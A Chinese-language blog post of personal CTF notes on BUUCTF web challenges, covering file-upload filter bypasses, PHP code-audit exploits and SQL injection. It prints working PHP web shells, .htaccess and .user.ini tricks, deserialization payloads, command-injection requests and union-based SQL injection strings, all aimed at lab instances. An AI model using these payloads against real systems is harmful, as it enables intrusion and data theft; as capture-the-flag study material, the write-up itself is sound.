---
layout: default
title: CTF Learning Challenges Notes (Upload)
categories:
- Security
tags:
- Security
---
//Description: CTF学习刷题笔记。记录刷 [BUUCTF](https://buuoj.cn/challenges) 题过程中遇到的问题。上传问题和代码审计问题分类

//Create Date: 2026-02-08 16:40:20

//Author: channy

[toc]

# Upload　文件上传类
## Basic
### [UPLOAD COURSE 1](https://buuoj.cn/challenges#BUU%20UPLOAD%20COURSE%201)
上传文件，发现会改名成xxx.jpg并储存在uploads上
写jpg马
```sh
echo -e '\xFF\xD8\xFF\xE0<?php system($_GET["cmd"]); ?>' > shell.jpg
```
访问
```
GET /index.php?file=uploads/6939648e99d96.jpg&cmd=cat%20upload.php HTTP/1.1
```
得到upload的代码
```php
<?php
/**
 * Created by PhpStorm.
 * User: jinzhao
 * Date: 2019/7/9
 * Time: 7:54 AM
 */


if(isset($_FILES['upload_file'])) {
    @mkdir("uploads/");


    $filename = uniqid().".jpg";
    move_uploaded_file($_FILES["upload_file"]["tmp_name"],
        "uploads/" . $filename);
    echo "æä»¶å·²å¨å­å¨: " . "uploads/" . $filename;
}

?>
```
再看index.php的代码
```php
<?php
/**
 * Created by PhpStorm.
 * User: jinzhao
 * Date: 2019/7/9
 * Time: 7:07 AM
 */

if(isset($_GET['file'])) {
    $re = '/^uploads\/[\d|\w]*.jpg$/m';
    $str = $_GET['file'];

    preg_match_all($re, $str, $matches, PREG_SET_ORDER, 0);

    if(count($matches) == 0 && $_GET['file'] !== 'upload.php') {
        die('ä½ ä¸èå®å¦~');
    }

    include $_GET['file'];
} else {
    Header('Location: index.php?file=upload.php');
}
```
最后发现并不需要，只要cmd中传入ls /就能发现有个flag文件，cmd=cat%20/flag可得flag

### [Upload](https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]Upload)
```sh
GIF89a
<?php @eval($_POST['cmd']);?>

# 或
<script language="php">eval($_POST['cmd']);</script>
```
使用`<?xxx`的或后缀`.php`的都上传不成功，拦截`<?`或`php`文件，改用`<script`的和`.phtml`的可以，上传到了upload文件夹下。再用AntSword连接得到flag

## Web
### [Upload](https://buuoj.cn/challenges#[ACTF2020%20%E6%96%B0%E7%94%9F%E8%B5%9B]Upload)
页面提示只能上传jpg,png和gif，上传后会改名但不会改后缀，修改filename用.phtml可上传成功
```sh
------WebKitFormBoundarytIH6nB2DbB83MTUp
Content-Disposition: form-data; name="upload_file"; filename="info.phtml"
Content-Type: image/gif

GIF89a
<?php @eval($_POST['cmd']); ?>

------WebKitFormBoundarytIH6nB2DbB83MTUp
```
然后使用AntSword连接得到根目录下的flag

### [BabyUpload](https://buuoj.cn/challenges#[GXYCTF2019]BabyUpload)
上传后缀不能包含`ph`，类型必须是`image/jpeg`，文件内容不能有<php ?>标识。故考虑先上传.htaccess
```sh
<FilesMatch "shell">
SetHandler application/x-httpd-php
</FilesMatch>
```
再直接上传图像马
```php
------WebKitFormBoundaryTPmfk7bmf17P7r0z
Content-Disposition: form-data; name="uploaded"; filename="shell.jpg"
Content-Type: image/jpeg

<script language="php">eval($_POST['cmd']);</script>
```
使用AntSword工具即可

### [传马](https://buuoj.cn/challenges#[MRCTF2020]%E4%BD%A0%E4%BC%A0%E4%BD%A0%F0%9F%90%8E%E5%91%A2)
类型只接收Content-Type: image/jpeg，考虑先上传.htaccess
```sh
<FilesMatch "shell\.jpg">
SetHandler application/x-httpd-php
</FilesMatch>
```
再上传shell.jpg
```php
<?php system($_GET["cmd"]); ?>
```
发现访问shell.jpg图像报错，`system()`函数被禁用
```
Warning: system() has been disabled for security reasons in /var/www/html/upload/8cfdf6d65d3aeb47156c9e393e5decda/cmd.jpg on line 1
```
查看禁用的函数
```
Content-Disposition: form-data; name="uploaded"; filename="cmd.jpg"
Content-Type: image/jpeg

<?php
echo "Disabled functions: " . ini_get('disable_functions');
?>

Disabled functions: pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld
```
直接读文件
```
Content-Disposition: form-data; name="uploaded"; filename="cmd.jpg"
Content-Type: image/jpeg

<?php
highlight_file('/flag');
?>
```

### [CheckIn](https://buuoj.cn/challenges#[SUCTF%202019]CheckIn)
不能上传php后缀，不能带`<?`
```sh
<? in contents!
```
```
filename="cmd.gif"
Content-Type: image/gif

GIF89a
<script language="php">eval($_POST['cmd']);</script>



filename=".htaccess"
Content-Type: image/gif

GIF89a;
# need this
<FilesMatch "cmd\.gif">
SetHandler application/x-httpd-php
</FilesMatch>
```
上传加了头的.htaccess后未起作用。.user.ini需要目录下有.php
```
GIF89a
auto_prepend_file=cmd.gif
```
用AntSward连的应该是index.php而不是图片马。。。

# 代码审计类
## Basic
### [1 LFI COURSE 1](https://buuoj.cn/challenges#BUU%20LFI%20COURSE%201)
```php
highlight_file(__FILE__);

if(isset($_GET['file'])) {
    $str = $_GET['file'];

    include $_GET['file'];
}
```
直接在Get请求中加入file=flag参数即可
```sh
GET /?file=/flag HTTP/1.1
```
### [Greatphp](https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202020]Greatphp)
php中md5和sha1的绕过
```php
<?php
class SYCLOVER {
        public $syc;
        public $lover;
}
// 正则过滤，改用urlencode-decode/xor
$cmd = "/flag";
$cmdencode = urlencode(~$cmd);
echo $cmdencode;
echo "\n";
/* <?= ?> 等同于<?php ?> */
$str = "?><?=include~".urldecode($cmdencode)."?>";
$cls = new SYCLOVER();
// 同一行保证message相同，但类本身因错误码不同而不同
$a = new Error($str, 1);$b = new Error($str, 2); 

$cls->syc = $a; 
$cls->lover = $b; 

echo urlencode(serialize($cls));
?>
```
### [Roamphp2-Myblog](https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202020]Roamphp2-Myblog)
```
GET /index.php?page=php://filter/read=convert.Base64-encode/resource=login HTTP/1.1

GET /index.php?page=php://filter/read=convert.Base64-encode/resource=secret HTTP/1.1
```
```php
<?php\nrequire_once("secret.php");\n
mt_srand($secret_seed);\n
$_SESSION[\'password\'] = mt_rand();\n?>\n'

<?php\n$secret_seed = mt_rand();\n?>\n
```
登录失败页面
```
http://c6f1a9dc-119f-4e60-a86d-52adac541ade.node5.buuoj.cn:81/?page=admin/user

GET /index.php?page=php://filter/read=convert.Base64-encode/resource=admin/user HTTP/1.1
```
```php
if (isset($_POST[\'username\']) and isset($_POST[\'password\'])){\n\t
if ($_POST[\'username\'] === "Longlone" and $_POST[\'password\'] == $_SESSION[\'password\']){  // No one knows my password, including 
myself\n\t\t
$logined = true;

<?php
if(isset($_FILES['Files']) and $_SESSION['status'] === true){
    $tmp_file = $_FILES['Files']['name'];
    $tmp_path = $_FILES['Files']['tmp_name'];
    if(($extension = pathinfo($tmp_file)['extension']) != ""){
        $allows = array('gif','jpeg','jpg','png');
        if(in_array($extension,$allows,true) and in_array($_FILES['Files']['type'],array_map(function($ext){return 'image/'.$ext;},$allows),true)){
            $upload_name = sha1(md5(uniqid(microtime(true), true))).'.'.$extension;
            move_uploaded_file($tmp_path,"assets/img/upload/".$upload_name);
            echo "<script>alert('Update image -> assets/img/upload/${upload_name}') </script>";
        } else {
            echo "<script>alert('Update illegal! Only allows like \'gif\', \'jpeg\', \'jpg\', \'png\' ') </script>";
        }
    }
}
?>
```
login页面产生password -> 登录提交SSID、username和password -> 后台对比password -> 提交抓包置空SSID和password绕过  

phpinfo一句话码.php打包成.zip上传访问，zip://bagname#filename流中的文件都会被当成php，但get遇到#会解析故需要转义
```
GET /index.php?page=zip://./assets/img/upload/xxx_uploadname.jpg%23xxx_filename HTTP/1.1
GET /index.php?page=phar://./assets/img/upload/xxx_uploadname.jpg/xxx_filename HTTP/1.1
```
页面均显示空白...  

看了wp都是这个路，但本人尝试多遍均返回空白内容，返回200但Content-Length: 0，暂且记下

## Web
### [NiZhuanSiWei](https://buuoj.cn/challenges#[ZJCTF%202019]NiZhuanSiWei)
```php
<?php  
$text = $_GET["text"];
$file = $_GET["file"];
$password = $_GET["password"];
if(isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf")){
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
    if(preg_match("/flag/",$file)){
        echo "Not now!";
        exit(); 
    }else{
        include($file);  //useless.php
        $password = unserialize($password);
        echo $password;
    }
}
else{
    highlight_file(__FILE__);
}
?>
```

```py
import base64
b = base64.b64encode(b'welcome to the zjctf').decode()
print(b)
d2VsY29tZSB0byB0aGUgempjdGY=
```
```sh
GET /?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&file=useless.php&password=s:6:%22%22ls%20%2f%22%22; HTTP/1.1

GET /?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&file=php://filter/read=convert.base64-encode/resource=useless.php&password=s:6:%22%22ls%20%2f%22%22; HTTP/1.1
```
useless.php
```php
<?php  

class Flag{  //flag.php  
    public $file;  
    public function __tostring(){  
        if(isset($this->file)){  
            echo file_get_contents($this->file); 
            echo "<br>";
        return ("U R SO CLOSE !///COME ON PLZ");
        }  
    }  
}  
?> 
```
flag.php
```sh
GET /?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&file=useless.php&password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";} 
```
```php 
<!--but i cant give it to u now-->

<?php

if(2===3){  
	return ("flag{8fbd3714-3fcb-4746-b6fc-c50f5068030e}");
}

?>
```

### [Ez_bypass](https://buuoj.cn/challenges#[MRCTF2020]Ez_bypass)
```js
I put something in F12 for you include 'flag.php'; $flag='MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}'; if(isset($_GET['gg'])&&isset($_GET['id'])) { $id=$_GET['id']; $gg=$_GET['gg']; if (md5($id) === md5($gg) && $id !== $gg) { echo 'You got the first step'; if(isset($_POST['passwd'])) { $passwd=$_POST['passwd']; if (!is_numeric($passwd)) { if($passwd==1234567) { echo 'Good Job!'; highlight_file('flag.php'); die('By Retr_0'); } else { echo "can you think twice??"; } } else{ echo 'You can not get it !'; } } else{ die('only one way to get the flag'); } } else { echo "You are not a real hacker!"; } } else{ die('Please input first'); } }Please input first
```
get转post，数组绕过md5
```
GET /?gg[]=1&id[]=2&passwd[]=1234567 HTTP/1.1


POST /?gg[]=1&id[]=2 HTTP/1.1
......
Content-Type: application/x-www-form-urlencoded
Content-Length: 19

passwd=1234567t
```
### [AreUSerialz](https://buuoj.cn/challenges#[%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E9%9D%92%E9%BE%99%E7%BB%84]AreUSerialz)
```php
<?php

include("flag.php");

highlight_file(__FILE__);

class FileHandler {

    protected $op;
    protected $filename;
    protected $content;

    function __construct() {
        $op = "1";
        $filename = "/tmp/tmpfile";
        $content = "Hello World!";
        $this->process();
    }

    public function process() {
        if($this->op == "1") {
            $this->write();
        } else if($this->op == "2") {
            $res = $this->read();
            $this->output($res);
        } else {
            $this->output("Bad Hacker!");
        }
    }

    private function write() {
        if(isset($this->filename) && isset($this->content)) {
            if(strlen((string)$this->content) > 100) {
                $this->output("Too long!");
                die();
            }
            $res = file_put_contents($this->filename, $this->content);
            if($res) $this->output("Successful!");
            else $this->output("Failed!");
        } else {
            $this->output("Failed!");
        }
    }

    private function read() {
        $res = "";
        if(isset($this->filename)) {
            $res = file_get_contents($this->filename);
        }
        return $res;
    }

    private function output($s) {
        echo "[Result]: <br>";
        echo $s;
    }

    function __destruct() {
        if($this->op === "2")
            $this->op = "1";
        $this->content = "";
        $this->process();
    }

}

function is_valid($s) {
    for($i = 0; $i < strlen($s); $i++)
        if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))
            return false;
    return true;
}

if(isset($_GET{'str'})) {

    $str = (string)$_GET['str'];
    if(is_valid($str)) {
        $obj = unserialize($str);
    }

}
```
反序列化，但不能用protected，改用public可以
```php
<?php
class FileHandler {
    protected $op = 2;
    protected $filename = "flag.php";
    protected $content;
}
$Handler = new FileHandler();
echo serialize($Handler)
?>
```
```sh
GET /?str=O:11:"FileHandler":3:{s:2:"op";i:2;s:8:"filename";s:8:"flag.php";s:7:"content";N;} HTTP/1.1
```
### [Had a bad day](https://buuoj.cn/challenges#[BSidesCF%202020]Had%20a%20bad%20day)
文件包含漏洞
```
GET /index.php?category=php://filter/read=convert.base64-encode/resource=index HTTP/1.1
```
```php
 <?php
				$file = $_GET['category'];

				if(isset($file))
				{
					if( strpos( $file, "woofers" ) !==  false || strpos( $file, "meowers" ) !==  false || strpos( $file, "index")){
						include ($file . '.php');
					}
					else{
						echo "Sorry, we currently only support woofers and meowers.";
					}
				}
				?>
```
```
GET /index.php?category=woofers/../flag HTTP/1.1
```
### [不过如此](https://buuoj.cn/challenges#[BJDCTF2020]ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4)
```php
<?php

error_reporting(0);
$text = $_GET["text"];
$file = $_GET["file"];
if(isset($text)&&(file_get_contents($text,'r')==="I have a dream")){
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
    if(preg_match("/flag/",$file)){
        die("Not now!");
    }

    include($file);  //next.php
    
}
else{
    highlight_file(__FILE__);
}
?>
```
```
GET /?text=data://text/plain,I%20have%20a%20dream&file=php://filter/convert.base64-encode/resource=next.php HTTP/1.1
```
```php
<?php
$id = $_GET['id'];
$_SESSION['id'] = $id;

function complex($re, $str) {
    return preg_replace(
        '/(' . $re . ')/ei',
        'strtolower("\\1")',
        $str
    );
}


foreach($_GET as $re => $str) {
    echo complex($re, $str). "\n";
}

function getFlag(){
	@eval($_GET['cmd']);
}

```
```
GET /next.php?\S*=${getFlag()}&cmd=system('ls%20/'); HTTP/1.1

GET /next.php?\S*=${getFlag()}&cmd=system('cat%20/flag'); HTTP/1.1
```
### [Online Tool](https://buuoj.cn/challenges#[BUUCTF%202018]Online%20Tool)
```php
<?php

if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_X_FORWARDED_FOR'];
}

if(!isset($_GET['host'])) {
    highlight_file(__FILE__);
} else {
    $host = $_GET['host'];
    $host = escapeshellarg($host);
    $host = escapeshellcmd($host);
    $sandbox = md5("glzjin". $_SERVER['REMOTE_ADDR']);
    echo 'you are in sandbox '.$sandbox;
    @mkdir($sandbox);
    chdir($sandbox);
    echo system("nmap -T5 -sT -Pn --host-timeout 2 -F ".$host);
}
```
X-Forwarded-For可以伪造，escapeshellarg 和 escapeshellcmd 对输入转义并连接到nmap命令，`-oG`输出到文件，故`/?host=' <?php echo cat /flag;?> -oG test.php`
```sh
GET /?host='%20<?php%20echo%20`cat%20/flag`;?>%20-oG%20test.php%20' HTTP/1.1

X-Forwarded-For: 127.0.0.1

you are in sandbox e6305cd14dbe6e1fc4041d81cb3fc9eeStarting Nmap 7.70 ( https://nmap.org ) at 2026-02-13 07:06 UTC
```
需要连接"http://043fd53a-cb05-4be3-b1e3-51017ac9017d.node5.buuoj.cn:81/e6305cd14dbe6e1fc4041d81cb3fc9ee/test.php"才显示flag
### [easy_web](https://buuoj.cn/challenges#[%E5%AE%89%E6%B4%B5%E6%9D%AF%202019]easy_web)
```sh
GET /index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&cmd= HTTP/1.1
```
`TXpVek5UTTFNbVUzTURabE5qYz0`->base64->base64->ascii hex->`555.png`，反向操作`index.php`得到源码
```php
<?php
error_reporting(E_ALL || ~ E_NOTICE);
header('content-type:text/html;charset=utf-8');
$cmd = $_GET['cmd'];
if (!isset($_GET['img']) || !isset($_GET['cmd'])) 
    header('Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&cmd=');
$file = hex2bin(base64_decode(base64_decode($_GET['img'])));

$file = preg_replace("/[^a-zA-Z0-9.]+/", "", $file);
if (preg_match("/flag/i", $file)) {
    echo '<img src ="./ctf3.jpeg">';
    die("xixiï½ no flag");
} else {
    $txt = base64_encode(file_get_contents($file));
    echo "<img src='data:image/gif;base64," . $txt . "'></img>";
    echo "<br>";
}
echo $cmd;
echo "<br>";
if (preg_match("/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\{|\}|\(|\)|\&[^\d]|@|\||\\$|\[|\]|{|}|\(|\)|-|<|>/i", $cmd)) {
    echo("forbid ~");
    echo "<br>";
} else {
    if ((string)$_POST['a'] !== (string)$_POST['b'] && md5($_POST['a']) === md5($_POST['b'])) {
        echo `$cmd`;
    } else {
        echo ("md5 is funny ~");
    }
}

?>
```
md5强绕过
```sh
POST /index.php?img=TW1ZMk5UYzBOak15Wmpjd05qRTNNemN6TnpjMk5BPT0=&cmd=ca\t%20/flag HTTP/1.1
Host: dac5773f-21c6-449b-9cad-7cddec03f963.node5.buuoj.cn:81
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://dac5773f-21c6-449b-9cad-7cddec03f963.node5.buuoj.cn:81/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 393

a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2
&b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2
```
### [Ezoop](https://buuoj.cn/challenges#[MRCTF2020]Ezpop)
```php
Welcome to index.php
<?php
//flag is in flag.php
//WTF IS THIS?
//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95
//And Crack It!
class Modifier {
    protected  $var;
    public function append($value){
        include($value);
    }
    public function __invoke(){
        $this->append($this->var);
    }
}

class Show{
    public $source;
    public $str;
    public function __construct($file='index.php'){
        $this->source = $file;
        echo 'Welcome to '.$this->source."<br>";
    }
    public function __toString(){
        return $this->str->source;
    }

    public function __wakeup(){
        if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {
            echo "hacker";
            $this->source = "index.php";
        }
    }
}

class Test{
    public $p;
    public function __construct(){
        $this->p = array();
    }

    public function __get($key){
        $function = $this->p;
        return $function();
    }
}

if(isset($_GET['pop'])){
    @unserialize($_GET['pop']);
}
else{
    $a=new Show;
    highlight_file(__FILE__);
}
```
反序列化
```php
<?php
class Modifier {
    protected  $var = "php://filter/read=convert.base64-encode/resource=flag.php";
    public function append($value){
        include($value);
    }
    public function __invoke(){
        $this->append($this->var);
    }
}
$Modifier = new Modifier;
class Test{
    public $p;
    public function __construct(){
        $this->p = array();
    }

    public function __get($key){
        $function = $this->p;
        return $function();
    }
}
$Test = new Test;
$Test->p = $Modifier;
class Show{
    public $source;
    public $str;
    public function __construct($file='index.php'){
        $this->source = $file;
        echo 'Welcome to '.$this->source."<br>";
    }
    public function __toString(){
        return $this->str->source;
    }

    public function __wakeup(){
        if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {
            echo "hacker";
            $this->source = "index.php";
        }
    }
}
$Show1 = new Show();
$Show2 = new Show();
$Show1->source = $Show2;
$Show2->str = $Test;
echo serialize($Show1)."\n---\n";
echo urlencode(serialize($Show1))."\n\n";
?>
```
### [PYWebsite](https://buuoj.cn/challenges#[MRCTF2020]PYWebsite)
```php
    function validate(){
      var code = document.getElementById("vcode").value;
      if (code != ""){
        if(hex_md5(code) == "0cd4da0223c0b280829dc3ea458d655c"){
          alert("您通过了验证！");
          window.location = "./flag.php"
        }else{
          alert("你的授权码不正确！");
        }
      }else{
        alert("请输入授权码");
      }
      
    }
```
md5爆破失败，前端可直接绕过，请求的最后两行空行需要，否则会报Timeout请求错误
```sh
GET /flag.php HTTP/1.

X-Forwarded-For: 127.0.0.1


```
### [easy_serialize_php](https://buuoj.cn/challenges#[%E5%AE%89%E6%B4%B5%E6%9D%AF%202019]easy_serialize_php)
```php
<?php

$function = @$_GET['f'];

function filter($img){
    $filter_arr = array('php','flag','php5','php4','fl1g');
    $filter = '/'.implode('|',$filter_arr).'/i';
    return preg_replace($filter,'',$img);
}


if($_SESSION){
    unset($_SESSION);
}

$_SESSION["user"] = 'guest';
$_SESSION['function'] = $function;

extract($_POST);

if(!$function){
    echo '<a href="index.php?f=highlight_file">source_code</a>';
}

if(!$_GET['img_path']){
    $_SESSION['img'] = base64_encode('guest_img.png');
}else{
    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));
}

$serialize_info = filter(serialize($_SESSION));

if($function == 'highlight_file'){
    highlight_file('index.php');
}else if($function == 'phpinfo'){
    eval('phpinfo();'); //maybe you can find something in here!
}else if($function == 'show_image'){
    $userinfo = unserialize($serialize_info);
    echo file_get_contents(base64_decode($userinfo['img']));
}
```
`flflagag`等可以绕过filter, 但序列化后前面的长度不变，以此错位破题
```sh
GET /index.php?f=show_image HTTP/1.1

Content-Type: application/x-www-form-urlencoded

_SESSION['flagflag']=";s:3:"aaa";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}

_SESSION['flagflag']=";s:3:"aaa";s:3:"img";s:20:"L2QwZzNfZmxsbGxsbGFn";}
```
### [ReadlezPHP](https://buuoj.cn/challenges#[NPUCTF2020]ReadlezPHP)
```php
<?php
#error_reporting(0);
class HelloPhp
{
    public $a;
    public $b;
    public function __construct(){
        $this->a = "Y-m-d h:i:s";
        $this->b = "date";
    }
    public function __destruct(){
        $a = $this->a;
        $b = $this->b;
        echo $b($a);
    }
}
$c = new HelloPhp;

if(isset($_GET['source']))
{;
    highlight_file(__FILE__);
    die(0);
}

@$ppp = unserialize($_GET["data"]);
```
从phpinfo()中查看flag文件名或flag内容，才发现system/exec等都被disable了，怪不得system(ls)什么输出都没有。
```sh
GET /time.php?data=O:8:"HelloPhp":2:{s:1:"a";s:9:"phpinfo()";s:1:"b";s:6:"assert";} HTTP/1.1
```
### [Love Math](https://buuoj.cn/challenges#[CISCN%202019%20%E5%88%9D%E8%B5%9B]Love%20Math)
```php
<?php
error_reporting(0);
//听说你很喜欢数学，不知道你是否爱它胜过爱flag
if(!isset($_GET['c'])){
    show_source(__FILE__);
}else{
    //例子 c=20-1
    $content = $_GET['c'];
    if (strlen($content) >= 80) {
        die("太长了不会算");
    }
    $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]'];
    foreach ($blacklist as $blackitem) {
        if (preg_match('/' . $blackitem . '/m', $content)) {
            die("请不要输入奇奇怪怪的字符");
        }
    }
    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp
    $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];
    preg_match_all('/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/', $content, $used_funcs);  
    foreach ($used_funcs[0] as $func) {
        if (!in_array($func, $whitelist)) {
            die("请不要输入奇奇怪怪的函数");
        }
    }
    //帮你算出答案
    eval('echo '.$content.';');
}
```
有用的函数：十进制/十六进制`dechex/hexdex`，十进制/二进制`bindec/decbin`，任意进制`base_convert`，十进制八进制`decoct/octdec`。其它函数`hex2bin/bin2hex`。
```sh
system(ls) -> base_convert(1751504350,10,36)(base_convert(784,10,36))

dex2bin = base_convert(25071743913,10,36) -> base_convert(bin2hex,36,10) = 25071743913

hex2bin = base_convert(37907361743,10,36) -> base_convert(hex2bin,36,10) = 37907361743

ls / = hex2bin(dechex(1819484207)) = base_convert(37907361743,10,36)(dechex(1819484207))

exec(ls /) -> base_convert(696468,10,36)(dec(1819484207))
```
或者构造_GET['xxx']
```sh
_GET = hex2bin(dechex(1598506324))

GET /?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){abs})&pi=system&abs=ls%20/ HTTP/1.1

$c=_GET['a']
```
### [禁止套娃](https://buuoj.cn/challenges#[GXYCTF2019]%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83)
```sh
./dirsearch.py -u http://3e5ded7b-55f6-4240-8976-46a99e9662eb.node5.buuoj.cn:81/ -e "*" --delay 0.1 -t 1 -i 200,403

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, jsp, asp, aspx, do, action, cgi, html, htm, js, tar.gz
HTTP method: GET | Threads: 1 | Wordlist size: 15045

Target: http://3e5ded7b-55f6-4240-8976-46a99e9662eb.node5.buuoj.cn:81/

[15:16:33] Scanning: 
[15:18:40] 403 -   571B - /.git/
```
git
```php
<?php
include "flag.php";
echo "flag在哪里呢？<br>";
if(isset($_GET['exp'])){
    if (!preg_match('/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i', $_GET['exp'])) {
        if(';' === preg_replace('/[a-z,_]+\((?R)?\)/', NULL, $_GET['exp'])) {
            if (!preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])) {
                // echo $_GET['exp'];
                @eval($_GET['exp']);
            }
            else{
                die("还差一点哦！");
            }
        }
        else{
            die("再好好想想！");
        }
    }
    else{
        die("还想读flag，臭弟弟！");
    }
}
// highlight_file(__FILE__);
?>
```
第一层：过滤文件直接访问；第二层：只允许不带参函数，可嵌套；第三层：过滤部分关键字
```sh
GET /?exp=show_source(array_rand(array_flip(scandir(pos(localeconv()))))); HTTP/1.1
```

# SQL类
## Basic
### [Juice Shop](https://buuoj.cn/challenges#Juice%20Shop)
SQL注入+爆破
### [2019 EasySQL](https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]EasySQL)
SQL漏洞，`1' or 1=1#`登录成功
```
GET /check.php?username=1%27+or+1%3D1%23&password=1 HTTP/1.1
```
### [2019 LoveSQL](https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]LoveSQL)
sql的select没有group_concat一般只回显一条记录
```sql
username=1&password=2' or 1='1' group by 3#
username=1&password=2%27%20or%201=%271%27%20group%20by%203%23

> Unknown column '4' in 'group statement'

username=1&password=2%27%20union%20select%201,2,3%23
> 2,3
username=1&password=2%27%20union%20select%201,database(),3%23
> geek
username=1&password=2%27%20union%20select%201,group_concat(table_name),3%20from%20mysql.innodb_table_stats%20where%20database_name='geek'%23
> geekuser,l0ve1ysq1
username=1&password=2%27%20union%20select%201,group_concat(column_name),3%20from%20information_schema.columns%20where%20table_schema='geek'%20and%20table_name='geekuser'%23
> username,password
> id,username,password (table_name='l0ve1ysq1')
username=1&password=2%27%20union%20select%201,username,password%20from%20geek.geekuser%23
> admin, 251c39b7cef2c57ab4eb885d375d723a
> cl4y, wo_tai_nan_le
username=1&password=2%27%20union%20select%201,2,group_concat(id,username,password)%20from%20geek.l0ve1ysq1%23
```
### [2019 BabySQL](https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]BabySQL)
```
GET /check.php?username=admin&password=1'%20order%20by%206%20--%20- HTTP/1.1
> MariaDB server version for the right syntax to use near 'der  6 -- -'' at line 1
GET /check.php?username=admin&password=1'oorr'1'='1'%20--%20- HTTP/1.1
```
过滤了`or`和`by`
```
GET /check.php?username=admin&password=1'union%20select1,2,3%20--%20- HTTP/1.1
> MariaDB server version for the right syntax to use near '1,2,3 -- -'' at line 1
```
过滤了`union`和`select`，尝试带其它关键词的发现也过滤了`where`、`from`、`and`。
```
GET /check.php?username=1&password=1'%20uunionnion%20sselectelect%201,2,3--%20- HTTP/1.1
> 2, 3
GET /check.php?username=1&password=1'%20uunionnion%20sselectelect%201,group_concat(table_name),3%20ffromrom%20mysql.innodb_table_stats%20wwherehere%20database_name='geek'--%20- HTTP/1.1
> b4bsql,geekuser
